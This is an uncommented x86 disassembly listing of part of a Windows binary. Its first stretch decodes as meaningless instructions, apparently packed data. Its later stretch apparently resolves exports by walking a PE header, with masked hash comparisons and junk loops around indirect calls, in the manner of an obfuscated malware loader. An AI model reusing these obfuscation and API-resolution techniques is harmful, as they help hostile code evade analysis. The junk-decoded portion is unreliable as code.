  40ff6d:	sub    BYTE PTR [eax-0x7811db7d],ch
  40ff73:	mov    ds:0x9abb69c9,al
  40ff78:	dec    edi
  40ff79:	mov    ebx,0x1a0bdd90
  40ff7e:	xor    BYTE PTR [esi+0x3e430dba],0x5d
  40ff85:	les    edi,FWORD PTR [ecx-0x75]
  40ff88:	add    bl,bh
  40ff8a:	adc    esi,ecx
  40ff8c:	pushf  
  40ff8d:	xchg   esi,esi
  40ff8f:	cli    
  40ff90:	test   DWORD PTR [eax],ebp
  40ff92:	and    BYTE PTR [ebx],cl
  40ff94:	sub    BYTE PTR [ebp-0x262d2f7c],al
  40ff9a:	daa    
  40ff9b:	ds popa 
  40ff9d:	and    al,0x5e
  40ff9f:	xchg   edi,eax
  40ffa0:	enter  0x7e88,0xa2
  40ffa4:	sar    BYTE PTR [eax],0xba
  40ffa7:	fist   WORD PTR [ebx+0x5495f9c6]
  40ffad:	sub    BYTE PTR [esi],bl
  40ffaf:	and    eax,DWORD PTR [ebp-0x48]
  40ffb2:	dec    ebp
  40ffb3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ffb4:	iret   
  40ffb5:	push   ecx
  40ffb6:	imul   esi,ebx,0x7c
  40ffb9:	aas    
  40ffba:	aam    0xb3
  40ffbc:	lods   eax,DWORD PTR ds:[esi]
  40ffbd:	das    
  40ffbe:	push   esi
  40ffbf:	mov    bh,0x9f
  40ffc1:	lahf   
  40ffc2:	jle    0x40fff4
  40ffc4:	cmp    DWORD PTR [edx],edi
  40ffc6:	jns    0x40ff4c
  40ffc8:	mov    eax,ds:0xa4531997
  40ffcd:	xor    DWORD PTR [edx+ebp*4+0x18],edi
  40ffd1:	daa    
  40ffd2:	xchg   esi,eax
  40ffd3:	imul   esi,DWORD PTR [esi-0x68],0x266e9ef1
  40ffda:	inc    esp
  40ffdb:	jmp    0x410023
  40ffdd:	iret   
  40ffde:	sbb    ebp,eax
  40ffe0:	xchg   dl,dh
  40ffe2:	hlt    
  40ffe3:	sub    eax,0x5e2087cf
  40ffe8:	jmp    0xb85e:0x367c2585
  40ffef:	mov    al,0x8f
  40fff1:	cld    
  40fff2:	in     al,dx
  40fff3:	xor    al,0x55
  40fff5:	loop   0x40ffaf
  40fff7:	dec    esi
  40fff8:	shr    eax,0x17
  40fffb:	or     ebp,DWORD PTR [eax]
  40fffd:	xor    eax,0x7dab63ee
  410002:	mov    al,ds:0x34c2efe5
  410007:	inc    DWORD PTR [ebx+0x401c6fd8]
  41000d:	inc    edi
  41000e:	fdivrp st(6),st
  410010:	in     eax,dx
  410011:	cmp    eax,0x15d26b33
  410016:	add    bh,BYTE PTR [edx+eax*4+0x1d73ec0b]
  41001d:	xchg   edx,eax
  41001e:	pop    es
  41001f:	cmp    esi,DWORD PTR [esi]
  410021:	push   cs
  410022:	dec    edx
  410023:	les    ebx,FWORD PTR [esi-0x23fcab34]
  410029:	call   0x768a:0x418267a3
  410030:	std    
  410031:	mov    esi,0xb28bfa59
  410036:	xor    BYTE PTR [esi-0x7cd398bb],cl
  41003c:	push   0x64b9ca24
  410041:	das    
  410042:	test   ebx,edx
  410044:	pushf  
  410045:	and    eax,0x287be778
  41004a:	lahf   
  41004b:	stc    
  41004c:	pop    esi
  41004d:	mov    dl,0xd7
  41004f:	dec    edi
  410050:	pop    ds
  410051:	fisubr WORD PTR [ecx-0x4]
  410054:	(bad)  [edi+edx*8]
  410057:	push   cs
  410058:	inc    edx
  410059:	sub    eax,DWORD PTR [esi-0x17]
  41005c:	iret   
  41005d:	icebp  
  41005e:	in     eax,0xa
  410060:	dec    edx
  410061:	add    al,BYTE PTR [eax+0x407cdfa]
  410067:	or     DWORD PTR gs:[esp+eax*4-0x33],edi
  41006c:	push   ss
  41006d:	lods   eax,DWORD PTR ds:[esi]
  41006e:	sub    edi,eax
  410070:	retf   
  410071:	push   es
  410072:	mov    ?,ebp
  410074:	push   es
  410075:	mov    ebp,0xc99e3ba2
  41007a:	adc    eax,0x74477ee3
  41007f:	mov    BYTE PTR [eax+0x5b],bh
  410082:	or     ah,bh
  410084:	fld    TBYTE PTR [ebp+0x76]
  410087:	add    BYTE PTR [edx-0x513eb6c2],cl
  41008d:	add    bh,BYTE PTR [edi]
  41008f:	fsub   DWORD PTR [esi-0x44b821b]
  410095:	sub    edi,DWORD PTR [edx+0x1]
  410098:	in     al,dx
  410099:	scas   al,BYTE PTR es:[edi]
  41009a:	mov    WORD PTR [eax-0x75],es
  41009d:	fdiv   QWORD PTR [esi]
  41009f:	push   ss
  4100a0:	fwait
  4100a1:	sbb    eax,0xef9c0622
  4100a6:	add    eax,0x102593f9
  4100ab:	(bad)  
  4100ac:	jno    0x410096
  4100ae:	retf   0x37cd
  4100b1:	cli    
  4100b2:	nop
  4100b3:	mov    ebx,0x2f5c8b30
  4100b8:	mov    bl,dh
  4100ba:	fucomp st(7)
  4100bc:	cwde   
  4100bd:	jmp    0x5d78:0xe011f784
  4100c4:	into   
  4100c5:	mov    ecx,0x6de4c41b
  4100ca:	(bad)  
  4100cb:	jnp    0x4100ac
  4100cd:	or     WORD PTR [edi+0x40],sp
  4100d1:	test   al,0x73
  4100d3:	mov    dh,0xd2
  4100d5:	arpl   WORD PTR [esi-0x6e],si
  4100d8:	inc    esi
  4100d9:	aad    0xdf
  4100db:	sub    al,0xd5
  4100dd:	or     BYTE PTR [eax],dl
  4100df:	jae    0x4100cd
  4100e1:	not    DWORD PTR [eax+0x30]
  4100e4:	test   al,0x2f
  4100e6:	(bad)  
  4100e7:	and    bl,dh
  4100e9:	out    dx,al
  4100ea:	mov    al,ds:0x2c475fb5
  4100ef:	mov    esp,?
  4100f1:	sbb    edi,DWORD PTR [edx+0x36dc6f1c]
  4100f7:	int3   
  4100f8:	add    eax,0xb61bf4a8
  4100fd:	pop    ebx
  4100fe:	mov    ds:0x3a2a3bcb,al
  410103:	add    DWORD PTR [ebp+0x4fa7d5db],edi
  410109:	repz push eax
  41010b:	fild   WORD PTR [eax+edi*8-0x56]
  41010f:	js     0x410143
  410111:	scas   al,BYTE PTR es:[edi]
  410112:	enter  0xb57e,0x6d
  410116:	mov    bl,0x3e
  410118:	inc    esi
  410119:	xor    DWORD PTR [edi+0x1182f3a3],ebp
  41011f:	mov    al,ds:0x6b64d30f
  410124:	loop   0x4100ff
  410126:	push   edx
  410127:	push   ss
  410128:	icebp  
  410129:	fcom   DWORD PTR [ebp+0x146f2569]
  41012f:	xchg   esi,eax
  410130:	or     ebp,DWORD PTR [eax]
  410132:	jmp    0x410170
  410134:	iret   
  410135:	push   edx
  410136:	ror    BYTE PTR [eax],0x7a
  410139:	lahf   
  41013a:	add    DWORD PTR [ecx],esi
  41013c:	adc    edx,ebp
  41013e:	inc    ebp
  41013f:	sub    cl,dl
  410141:	xchg   BYTE PTR [edx+0x47d8048b],cl
  410147:	out    0x10,al
  410149:	or     al,0xe2
  41014b:	xchg   al,dl
  41014d:	inc    ebx
  41014e:	add    al,0x62
  410150:	dec    esi
  410151:	jecxz  0x4101a8
  410153:	jl     0x410151
  410155:	xor    al,0xe
  410157:	fcmovnb st,st(0)
  410159:	gs inc esp
  41015b:	rcr    BYTE PTR [esi+0x6],1
  41015e:	int3   
  41015f:	adc    sp,bp
  410162:	or     bl,cl
  410164:	xchg   ebx,eax
  410165:	gs inc esp
  410167:	(bad)
  41016a:	lock pop ss
  41016c:	in     eax,dx
  41016d:	push   0xffffffeb
  41016f:	xlat   BYTE PTR ds:[ebx]
  410170:	jg     0x4101dc
  410172:	sbb    WORD PTR [esi],di
  410175:	retf   0x7e36
  410178:	bndstx [ebx],bnd3
  41017b:	add    eax,0x6b1b3f93
  410180:	dec    ecx
  410181:	pop    es
  410182:	out    dx,al
  410183:	mov    edi,0x7c70ee06
  410188:	lds    esp,FWORD PTR [edx+0x1078e320]
  41018e:	jle    0x4101eb
  410190:	fild   QWORD PTR [bx]
  410193:	leave  
  410194:	or     DWORD PTR [ebx+0x6b],0xfffffff1
  410198:	sbb    al,0xa
  41019a:	retf   0x6ed
  41019d:	jbe    0x4101a5
  41019f:	sub    BYTE PTR [esi+0x1],bl
  4101a2:	lds    esp,FWORD PTR [edi+0x24]
  4101a5:	jbe    0x41013b
  4101a7:	or     DWORD PTR [edi+0x1521c16d],esi
  4101ad:	mov    eax,0x972aa060
  4101b2:	lock push ecx
  4101b4:	xrelease lock xchg DWORD PTR [ecx*1+0x674d6fba],eax
  4101bd:	repnz int3 
  4101bf:	repnz in eax,dx
  4101c1:	mov    edi,0xb4712d65
  4101c6:	mov    DWORD PTR [ebx],esp
  4101c8:	adc    eax,0x3ec8eb25
  4101cd:	xchg   BYTE PTR [ecx+0x26935357],al
  4101d3:	sub    DWORD PTR [edx+0x7d3f57e9],esp
  4101d9:	xor    bh,BYTE PTR [ecx+0x13]
  4101dc:	and    edx,DWORD PTR [esi+0x62]
  4101df:	xchg   esp,eax
  4101e0:	pop    edi
  4101e1:	push   0xffffffe4
  4101e3:	icebp  
  4101e4:	test   al,0xec
  4101e6:	mov    ah,0xda
  4101e8:	hlt    
  4101e9:	ins    BYTE PTR es:[edi],dx
  4101ea:	xchg   ecx,eax
  4101eb:	ficomp DWORD PTR [ebx]
  4101ed:	div    DWORD PTR [eax-0x55]
  4101f0:	fisttp DWORD PTR es:[ebx+0x4e23827c]
  4101f7:	pop    esp
  4101f8:	fcmovnbe st,st(1)
  4101fa:	and    BYTE PTR cs:[ebx+ebx*8],al
  4101fe:	div    BYTE PTR [esi-0x1d5e4ec9]
  410204:	or     eax,0x8f23a70c
  410209:	pop    es
  41020a:	dec    ebp
  41020b:	clc    
  41020c:	fadd   QWORD PTR [ebx]
  41020e:	mov    ch,0xf2
  410210:	jge    0x4101f0
  410212:	pop    ebp
  410213:	cld    
  410214:	loope  0x410223
  410216:	push   ecx
  410217:	daa    
  410218:	add    DWORD PTR [eax+0x6f11c44],edi
  41021e:	push   edi
  41021f:	push   esi
  410220:	int    0x20
  410222:	sub    al,BYTE PTR [edi]
  410224:	jo     0x4101bd
  410226:	pushf  
  410227:	(bad)  [edi-0x3643e7c4]
  41022d:	inc    ecx
  41022e:	sub    bh,BYTE PTR [eax+eiz*4]
  410231:	outs   dx,DWORD PTR ds:[esi]
  410232:	pop    es
  410233:	sub    al,0xc3
  410235:	bound  ebx,QWORD PTR [edi-0x5f640e20]
  41023b:	ins    DWORD PTR es:[edi],dx
  41023c:	and    eax,0x6792dd3c
  410241:	pop    esi
  410242:	aad    0xe1
  410244:	inc    edi
  410245:	mov    ah,0x22
  410247:	leave  
  410248:	imul   ch
  41024a:	xor    bh,bh
  41024c:	push   ebx
  41024d:	jae    0x410295
  41024f:	cs mov ah,0x66
  410252:	sbb    eax,0xd37d984c
  410257:	ins    BYTE PTR es:[edi],dx
  410258:	mov    edi,0x51e80a39
  41025d:	inc    edi
  41025e:	sub    cl,BYTE PTR [ecx-0x35ce6f3e]
  410264:	daa    
  410265:	dec    ecx
  410266:	or     BYTE PTR [ebx-0x20],0x25
  41026a:	adc    edi,DWORD PTR [edx+0x434cada2]
  410270:	jl     0x4102e1
  410272:	(bad)  
  410273:	cwde   
  410274:	jmp    0xca81:0x6e132b57
  41027b:	ret    0x5af1
  41027e:	or     BYTE PTR [edi+0x79de0ab6],dh
  410284:	mov    dh,0x26
  410286:	push   ecx
  410287:	push   ds
  410288:	lea    esp,[edx+0x1094f6db]
  41028e:	mov    ah,0x9a
  410290:	xchg   DWORD PTR [ebp-0x50],ecx
  410293:	sbb    eax,0xd64ae259
  410298:	mov    ebp,DWORD PTR [ecx-0x77]
  41029b:	out    dx,al
  41029c:	pop    esp
  41029d:	(bad)  
  41029e:	dec    eax
  41029f:	and    esp,eax
  4102a1:	gs ret 0xd280
  4102a5:	xor    BYTE PTR [eax],dl
  4102a7:	loopne 0x410270
  4102a9:	in     al,0x55
  4102ab:	mov    dh,0xf
  4102ad:	test   eax,0x23b332e1
  4102b2:	pop    ecx
  4102b3:	mov    esp,0x47abdd74
  4102b8:	enter  0xdf0d,0xf
  4102bc:	mov    esi,0xe895af1c
  4102c1:	(bad)  
  4102c2:	stc    
  4102c3:	sub    ebx,ebx
  4102c5:	jbe    0x4102b5
  4102c7:	jl     0x41025c
  4102c9:	mov    ?,WORD PTR [edx-0x10c94c32]
  4102cf:	clc    
  4102d0:	daa    
  4102d1:	xor    edx,DWORD PTR [eax]
  4102d3:	jp     0x410288
  4102d5:	ins    BYTE PTR es:[edi],dx
  4102d6:	lds    ebx,FWORD PTR [ecx]
  4102d8:	lock lods al,BYTE PTR ds:[esi]
  4102da:	setl   BYTE PTR [esi+edx*2+0x11770c39]
  4102e2:	mov    esi,0x733d35a2
  4102e7:	pop    es
  4102e8:	sbb    BYTE PTR [ebx],ch
  4102ea:	inc    edi
  4102eb:	fwait
  4102ec:	les    esp,FWORD PTR [ebx]
  4102ee:	stc    
  4102ef:	push   eax
  4102f0:	addr16 mov ch,0x69
  4102f3:	and    BYTE PTR [edi],dl
  4102f5:	test   al,0xff
  4102f7:	dec    esp
  4102f8:	mov    dh,BYTE PTR ds:0xa7403629
  4102fe:	and    bl,BYTE PTR [edi]
  410300:	dec    ecx
  410301:	ds xchg dh,dh
  410304:	mov    al,0xae
  410306:	dec    eax
  410307:	xor    BYTE PTR [ecx-0x2893657f],0x47
  41030e:	mov    WORD PTR [ecx],es
  410310:	and    DWORD PTR [ebp+0x1a8b7be],ecx
  410316:	scas   al,BYTE PTR es:[edi]
  410317:	imul   ecx,DWORD PTR [esi+edi*1],0xe5838d4
  41031e:	adc    DWORD PTR [esi+edx*4-0x18],0xfffffffd
  410323:	adc    eax,0x5b86a1ec
  410328:	inc    edx
  410329:	or     esi,DWORD PTR [edx+edx*8]
  41032c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41032d:	(bad)  
  41032e:	pop    ebp
  41032f:	jmp    0x4d13df5e
  410334:	mov    eax,ds:0xb01308ab
  410339:	bound  ebp,QWORD PTR [eax+0x49]
  41033c:	scas   eax,DWORD PTR es:[edi]
  41033d:	mov    bh,0x50
  41033f:	xchg   DWORD PTR [esi-0x11cf54cd],ebp
  410345:	push   edx
  410346:	in     al,0xd
  410348:	call   0x7f9a:0xa7262fd9
  41034f:	std    
  410350:	push   edx
  410351:	add    DWORD PTR [ecx+0x38886206],ecx
  410357:	das    
  410358:	jge    0x410304
  41035a:	push   0xfc1dc3ff
  41035f:	mov    es,WORD PTR [eax]
  410361:	sbb    BYTE PTR [ebp+0x82844a8],ch
  410367:	test   DWORD PTR [ecx],ecx
  410369:	mov    ebp,0xbb85663b
  41036e:	dec    ebx
  41036f:	cmp    eax,DWORD PTR [eax]
  410371:	add    BYTE PTR [esi+0x2b],ah
  410374:	sti    
  410375:	mov    ebx,0x8a85
  41037a:	xor    di,bx
  41037d:	mov    ebx,0x4f8a
  410382:	cmp    di,bx
  410385:	jne    0x4103ad
  41038b:	movsx  di,BYTE PTR [eax]
  41038f:	mov    ebx,0x3b4b
  410394:	sub    di,bx
  410397:	mov    ebx,0x8a85
  41039c:	xor    di,bx
  41039f:	mov    ebx,0x4f87
  4103a4:	cmp    di,bx
  4103a7:	je     0x4103bd
  4103ad:	mov    edi,DWORD PTR [ebp-0x10]
  4103b0:	xor    edi,ecx
  4103b2:	mov    ebx,esi
  4103b4:	sub    ebx,edi
  4103b6:	add    eax,ebx
  4103b8:	jmp    0x40dfbd
  4103bd:	mov    esi,DWORD PTR [ebp-0x14]
  4103c0:	mov    esi,DWORD PTR [esi]
  4103c2:	mov    edi,DWORD PTR [eax+0x3c]
  4103c5:	lea    esi,[edi+esi*8+0x78]
  4103c9:	mov    esi,DWORD PTR [esi+eax*1]
  4103cc:	mov    DWORD PTR [ebp-0x8],esi
  4103cf:	mov    esi,DWORD PTR [ebp+0x8]
  4103d2:	xor    esi,ecx
  4103d4:	add    esi,edx
  4103d6:	mov    DWORD PTR [ebp-0x14],esi
  4103d9:	mov    esi,DWORD PTR [ebp+0x8]
  4103dc:	mov    edi,DWORD PTR [ebp-0x8]
  4103df:	xor    esi,ecx
  4103e1:	add    esi,edx
  4103e3:	pop    ebx
  4103e4:	cmp    edi,esi
  4103e6:	jne    0x410404
  4103ec:	mov    eax,DWORD PTR [ebp+0xc]
  4103ef:	xor    eax,ecx
  4103f1:	mov    ecx,DWORD PTR [ebp-0x8]
  4103f4:	add    eax,edx
  4103f6:	imul   eax,ecx
  4103f9:	mov    DWORD PTR [ebp-0x8],eax
  4103fc:	push   DWORD PTR [ebp+0x18]
  4103ff:	jmp    0x410458
  410404:	mov    ecx,DWORD PTR [ebp-0x8]
  410407:	add    ecx,eax
  410409:	mov    DWORD PTR [ebp-0x14],ecx
  41040c:	mov    ecx,DWORD PTR [ebp-0x14]
  41040f:	mov    ecx,DWORD PTR [ecx+0xc]
  410412:	movsx  cx,BYTE PTR [ecx+eax*1]
  410417:	mov    edx,0x3b4b
  41041c:	sub    cx,dx
  41041f:	mov    edx,0x8a85
  410424:	xor    cx,dx
  410427:	mov    edx,0x4f85
  41042c:	cmp    cx,dx
  41042f:	jne    0x4103fc
  410435:	mov    ecx,DWORD PTR ds:0x41d3dc
  41043b:	mov    ecx,DWORD PTR [ecx+0x198]
  410441:	mov    DWORD PTR [ecx],eax
  410443:	jmp    0x410469
  410448:	mov    ecx,DWORD PTR [ebp+0x18]
  41044b:	cmp    ecx,0xf89c85b5
  410451:	jne    0x410469
  410457:	push   eax
  410458:	push   DWORD PTR [ebp+0x14]
  41045b:	push   DWORD PTR [ebp+0x10]
  41045e:	push   DWORD PTR [ebp+0xc]
  410461:	push   DWORD PTR [ebp+0x8]
  410464:	call   0x40b7a6
  410469:	pop    edi
  41046a:	pop    esi
  41046b:	leave  
  41046c:	ret    0x14
  41046f:	push   ebp
  410470:	mov    ebp,esp
  410472:	sub    esp,0x48
  410475:	and    DWORD PTR ds:0x427018,0x0
  41047f:	mov    eax,ds:0x427018
  410484:	inc    eax
  410485:	mov    ds:0x427018,eax
  41048a:	cmp    DWORD PTR ds:0x427018,0xc
  410491:	jne    0x4104a6
  410497:	push   DWORD PTR [ebp-0xc]
  41049a:	push   DWORD PTR [ebp-0xc]
  41049d:	push   DWORD PTR [ebp-0x28]
  4104a0:	call   DWORD PTR ds:0x421028
  4104a6:	cmp    DWORD PTR ds:0x427018,0xb
  4104ad:	jne    0x4104be
  4104b3:	mov    eax,ds:0x427018
  4104b8:	inc    eax
  4104b9:	mov    ds:0x427018,eax
  4104be:	cmp    DWORD PTR ds:0x427018,0x1f
  4104c5:	jb     0x41047f
  4104cb:	adc    DWORD PTR ds:0x428010,ebx
  4104d1:	push   ebx
  4104d2:	mov    DWORD PTR ds:0x426010,0x1e
  4104dc:	cmp    DWORD PTR ds:0x426010,0x0
  4104e3:	je     0x410526
  4104e9:	cmp    DWORD PTR ds:0x426010,0x26
  4104f0:	jne    0x410501
  4104f6:	push   0x41ff82
  4104fb:	call   DWORD PTR ds:0x42102c
  410501:	xor    eax,eax
  410503:	xor    eax,DWORD PTR ds:0x426010
  410509:	dec    eax
  41050a:	mov    ds:0x426010,eax
  41050f:	jmp    0x4104dc
  410514:	movzx  eax,WORD PTR ds:0x427014
  41051b:	sub    eax,DWORD PTR ds:0x426004
  410521:	mov    ds:0x427014,eax
  410526:	push   esi
  410527:	push   edi
  410528:	and    DWORD PTR ds:0x428000,0x0
  410532:	jmp    0x410544
  410537:	mov    edi,DWORD PTR ds:0x428000
  41053d:	inc    edi
  41053e:	mov    DWORD PTR ds:0x428000,edi
  410544:	cmp    DWORD PTR ds:0x428000,0x1e
  41054b:	jae    0x410597
  410551:	cmp    DWORD PTR ds:0x428000,0x1f
  410558:	jne    0x41058c
  41055e:	push   DWORD PTR [ebp-0x28]
  410561:	push   0x3d00
  410566:	push   0x5480
  41056b:	push   DWORD PTR [ebp-0x10]
  41056e:	push   DWORD PTR [ebp-0x24]
  410571:	push   DWORD PTR [ebp-0x1c]
  410574:	push   0x6187
  410579:	push   DWORD PTR [ebp-0x20]
  41057c:	push   0x5fd8
  410581:	push   0x12ef
  410586:	call   DWORD PTR ds:0x421030
  41058c:	jmp    0x410537
  410591:	and    eax,DWORD PTR ds:0x426018
  410597:	xor    esi,esi
  410599:	and    DWORD PTR ds:0x428008,0x0
  4105a3:	jmp    0x4105b5
  4105a8:	mov    edi,DWORD PTR ds:0x428008
  4105ae:	inc    edi
  4105af:	mov    DWORD PTR ds:0x428008,edi
  4105b5:	cmp    DWORD PTR ds:0x428008,0x1e
  4105bc:	jae    0x4105ff
  4105c2:	cmp    DWORD PTR ds:0x428008,0xe
  4105c9:	jne    0x4105e0
  4105cf:	push   DWORD PTR [ebp-0x18]
  4105d2:	push   0x425020
  4105d7:	push   DWORD PTR [ebp-0x28]
  4105da:	call   DWORD PTR ds:0x421034
  4105e0:	cmp    DWORD PTR ds:0x428008,0xd
  4105e7:	jne    0x4105fa
  4105ed:	mov    edi,DWORD PTR ds:0x428008
  4105f3:	inc    edi
  4105f4:	mov    DWORD PTR ds:0x428008,edi
  4105fa:	jmp    0x4105a8
  4105ff:	mov    DWORD PTR [ebp-0x20],esi
  410602:	or     eax,edi
  410604:	mov    eax,DWORD PTR [ebp-0xc]
  410607:	push   0x21
  410609:	and    DWORD PTR ds:0x429004,edi
  41060f:	mov    DWORD PTR [ebp-0xc],eax
  410612:	add    edi,DWORD PTR ds:0x425020
  410618:	pop    edi
  410619:	add    DWORD PTR ds:0x425010,0x428010
  410623:	push   0x41d4f0
  410628:	call   DWORD PTR ds:0x421040
  41062e:	push   esi
  41062f:	and    DWORD PTR ds:0x425008,0x428018
  410639:	push   0x2
  41063b:	adc    DWORD PTR ds:0x425018,0x428008
  410645:	push   0x1
  410647:	xor    DWORD PTR ds:0x429004,0x425020
  410651:	push   0x2
  410653:	push   0x1
  410655:	add    DWORD PTR ds:0x42800c,0x158b
  41065f:	push   0x8678768
  410664:	push   0x87676776
  410669:	call   DWORD PTR ds:0x42100c
  41066f:	xor    DWORD PTR ds:0x427014,0x429004
  410679:	push   esi
  41067a:	add    DWORD PTR ds:0x42601c,0x4e21
  410684:	push   0x68
  410686:	and    DWORD PTR ds:0x425024,0x9b5
  410690:	push   0xd
  410692:	not    DWORD PTR ds:0x42501c
  410698:	push   0x5
  41069a:	or     DWORD PTR ds:0x425020,0x429010
  4106a4:	push   0x3
  4106a6:	push   0x5468787
  4106ab:	call   DWORD PTR ds:0x421024
  4106b1:	dec    edi
  4106b2:	mov    DWORD PTR ds:0x425010,0x709e
  4106bc:	jne    0x410619
  4106c2:	mov    eax,DWORD PTR [ebp-0xc]
  4106c5:	mov    DWORD PTR ds:0x425000,edi
  4106cb:	mov    ebx,0xf89c85b6
  4106d0:	cmp    eax,ebx
  4106d2:	mov    DWORD PTR ds:0x426014,0x6187
  4106dc:	jne    0x4107d8
  4106e2:	or     DWORD PTR ds:0x426008,0x425010
  4106ec:	mov    DWORD PTR ds:0x41d4ec,0xf89c85b5
  4106f6:	add    DWORD PTR ds:0x428014,0x8c5
  410700:	push   DWORD PTR [ebp+0x10]
  410703:	sbb    DWORD PTR ds:0x426004,0x426010
  41070d:	push   DWORD PTR [ebp+0xc]
  410710:	push   DWORD PTR [ebp+0x8]
  410713:	call   0x403cbf
  410718:	mov    DWORD PTR ds:0x426018,0x1f
  410722:	cmp    DWORD PTR ds:0x426018,0x0
  410729:	je     0x4107c2
  41072f:	cmp    DWORD PTR ds:0x426018,0xf
  410736:	jne    0x41074a
  41073c:	push   DWORD PTR [ebp-0x14]
  41073f:	push   0x348e
  410744:	call   DWORD PTR ds:0x421038
  41074a:	cmp    DWORD PTR ds:0x426018,0x10
  410751:	jne    0x410764
  410757:	mov    edi,DWORD PTR ds:0x426018
  41075d:	dec    edi
  41075e:	mov    DWORD PTR ds:0x426018,edi
  410764:	mov    edi,DWORD PTR ds:0x426018
  41076a:	dec    edi
  41076b:	mov    DWORD PTR ds:0x426018,edi
  410771:	jmp    0x410722
  410776:	and    DWORD PTR ds:0x429004,0x0
  410780:	mov    esi,DWORD PTR ds:0x429004
  410786:	inc    esi
  410787:	mov    DWORD PTR ds:0x429004,esi
  41078d:	cmp    DWORD PTR ds:0x429004,0x1f
  410794:	jne    0x4107b5
  41079a:	push   0x55b4
  41079f:	push   DWORD PTR [ebp-0x14]
  4107a2:	push   0x42600c
  4107a7:	push   0x45b8
  4107ac:	push   DWORD PTR [ebp-0x28]
  4107af:	call   DWORD PTR ds:0x421000
  4107b5:	cmp    DWORD PTR ds:0x429004,0x16
  4107bc:	jb     0x410780
  4107c2:	mov    ecx,DWORD PTR ds:0x41d3dc
  4107c8:	sub    esi,edi
  4107ca:	mov    ecx,DWORD PTR [ecx+0x1cc]
  4107d0:	and    edi,0x3fae
  4107d6:	mov    DWORD PTR [ecx],eax
  4107d8:	or     edi,DWORD PTR ds:0x425010
  4107de:	mov    DWORD PTR [ebp-0x4],ebx
  4107e1:	mov    DWORD PTR [ebp-0x8],0xf89c85b5
  4107e8:	lea    eax,[ebp-0x28]
  4107eb:	xor    DWORD PTR ds:0x425018,edx
  4107f1:	mov    DWORD PTR [ebp-0x20],eax
  4107f4:	sbb    edi,DWORD PTR ds:0x429010
  4107fa:	lea    eax,[ebp-0x2c]
  4107fd:	and    DWORD PTR ds:0x427014,0x0
  410807:	mov    edi,DWORD PTR ds:0x427014
  41080d:	inc    edi
  41080e:	mov    DWORD PTR ds:0x427014,edi
  410814:	cmp    DWORD PTR ds:0x427014,0x1d
  41081b:	jne    0x41082c
  410821:	push   0x45e3
  410826:	call   DWORD PTR ds:0x421004
  41082c:	cmp    DWORD PTR ds:0x427014,0x1c
  410833:	jb     0x410807
  410839:	sbb    DWORD PTR ds:0x42501c,edx
  41083f:	mov    DWORD PTR [ebp-0x1c],eax
  410842:	and    DWORD PTR ds:0x428010,0x0
  41084c:	mov    edi,DWORD PTR ds:0x428010
  410852:	inc    edi
  410853:	mov    DWORD PTR ds:0x428010,edi
  410859:	cmp    DWORD PTR ds:0x428010,0xd
  410860:	jne    0x410874
  410866:	push   0x41ffb1
  41086b:	push   DWORD PTR [ebp-0xc]
  41086e:	call   DWORD PTR ds:0x421008
  410874:	cmp    DWORD PTR ds:0x428010,0xc
  41087b:	jne    0x41088e
  410881:	mov    edi,DWORD PTR ds:0x428010
  410887:	inc    edi
  410888:	mov    DWORD PTR ds:0x428010,edi
  41088e:	cmp    DWORD PTR ds:0x428010,0x1b
  410895:	jb     0x41084c
  41089b:	and    edi,esi
  41089d:	mov    eax,ds:0x41d3dc
  4108a2:	sub    ecx,esi
  4108a4:	mov    eax,DWORD PTR [eax+0x1c8]
  4108aa:	mov    eax,DWORD PTR [eax]
  4108ac:	mov    ecx,DWORD PTR [ebp-0x1c]
  4108af:	not    edi
  4108b1:	mov    esi,0x7510893
  4108b6:	xor    eax,esi
  4108b8:	movzx  edi,BYTE PTR ds:0x425028
  4108bf:	add    DWORD PTR ds:0x427018,edi
  4108c5:	mov    edi,0x3272db
  4108ca:	adc    DWORD PTR ds:0x42601c,0x425018
  4108d4:	add    eax,edi
  4108d6:	mov    DWORD PTR ds:0x425000,0x302d
  4108e0:	mov    DWORD PTR [ecx],eax
  4108e2:	mov    DWORD PTR ds:0x429010,ebx
  4108e8:	mov    eax,ds:0x41d5d8
  4108ed:	mov    DWORD PTR ds:0x427008,0x286e
  4108f7:	cmp    eax,0x301ac8f5
  4108fc:	jne    0x41095e
  410902:	and    DWORD PTR ds:0x427000,0x0
  41090c:	xor    eax,eax
  41090e:	or     eax,DWORD PTR ds:0x427000
  410914:	inc    eax
  410915:	mov    ds:0x427000,eax
  41091a:	cmp    DWORD PTR ds:0x427000,0x19
  410921:	jne    0x410930
  410927:	push   DWORD PTR [ebp-0x28]
  41092a:	call   DWORD PTR ds:0x421048
  410930:	cmp    DWORD PTR ds:0x427000,0x17
  410937:	jb     0x41090c
  41093d:	mov    eax,DWORD PTR [ebp-0x4]
  410940:	mov    ecx,DWORD PTR ds:0x41d3dc
  410946:	mov    ecx,DWORD PTR [ecx+0x198]
  41094c:	xor    eax,esi
  41094e:	add    eax,edi
  410950:	mov    DWORD PTR [ecx],eax
  410952:	mov    eax,DWORD PTR [ebp-0x4]
  410955:	xor    eax,esi
  410957:	add    eax,edi
  410959:	mov    ds:0x41d5d8,eax
  41095e:	mov    eax,ds:0x41d3dc
  410963:	mov    eax,DWORD PTR [eax+0x18c]
  410969:	mov    eax,DWORD PTR [eax]
  41096b:	mov    DWORD PTR [ebp-0x30],eax
  41096e:	mov    eax,0xf89c85ba
  410973:	mov    DWORD PTR [ebp-0x1c],eax
  410976:	mov    DWORD PTR [ebp-0x1c],eax
  410979:	mov    DWORD PTR [ebp-0x1c],eax
  41097c:	mov    DWORD PTR [ebp-0x1c],ebx
  41097f:	mov    DWORD PTR [ebp-0x38],eax
  410982:	mov    DWORD PTR [ebp-0x38],0xf89c85be
  410989:	mov    ebx,DWORD PTR [ebp-0x4]
  41098c:	mov    ecx,DWORD PTR [ebp-0x8]
  41098f:	mov    edx,DWORD PTR [ebp-0x8]
  410992:	xor    edx,esi
  410994:	xor    ecx,esi
  410996:	add    ecx,edx
  410998:	mov    edx,DWORD PTR [ebp-0x8]
  41099b:	xor    ebx,esi
  41099d:	xor    edx,esi
  41099f:	add    ebx,edi
  4109a1:	lea    ecx,[ecx+edx*1+0x975891]
  4109a8:	cmp    ebx,ecx
  4109aa:	ja     0x410a0b
  4109b0:	mov    eax,DWORD PTR [ebp-0x8]
  4109b3:	xor    eax,esi
  4109b5:	lea    eax,[eax+ebx*1+0x3272db]
  4109bc:	push   eax
  4109bd:	mov    eax,DWORD PTR [ebp-0x1c]
  4109c0:	xor    eax,esi
